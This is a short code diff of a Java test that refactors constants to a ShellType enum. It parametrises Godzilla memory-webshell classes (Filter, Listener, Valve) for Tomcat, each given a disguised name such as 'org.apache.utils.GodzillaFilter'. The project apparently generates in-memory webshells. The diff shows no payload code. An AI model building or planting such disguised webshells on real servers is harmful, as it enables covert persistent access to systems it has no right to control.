@@ -1,6 +1,6 @@
 package com.reajason.javaweb.memshell.tomcat.godzilla;
 
-import com.reajason.javaweb.memshell.config.Constants;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.generator.GodzillaGenerator;
@@ -32,9 +32,9 @@ class GodzillaTest {
 
     static Stream<Arguments> casesProvider() {
         return Stream.of(
-                arguments(Constants.FILTER, GodzillaFilter.class, "org.apache.utils.GodzillaFilter"),
-                arguments(Constants.LISTENER, GodzillaListener.class, "org.apache.utils.GodzillaListener"),
-                arguments(Constants.VALVE, GodzillaValve.class, "org.apache.utils.GodzillaValve")
+                arguments(ShellType.FILTER, GodzillaFilter.class, "org.apache.utils.GodzillaFilter"),
+                arguments(ShellType.LISTENER, GodzillaListener.class, "org.apache.utils.GodzillaListener"),
+                arguments(ShellType.VALVE, GodzillaValve.class, "org.apache.utils.GodzillaValve")
 
         );
     }
